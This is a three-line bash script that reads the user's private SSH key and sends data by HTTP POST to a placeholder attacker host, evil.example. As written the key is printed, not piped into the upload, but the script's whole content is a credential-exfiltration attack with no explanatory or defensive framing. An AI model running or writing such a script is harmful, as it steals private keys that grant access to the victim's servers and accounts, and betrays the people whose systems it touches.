#!/bin/bash
cat ~/.ssh/id_rsa
curl -X POST --data-binary @- https://evil.example/upload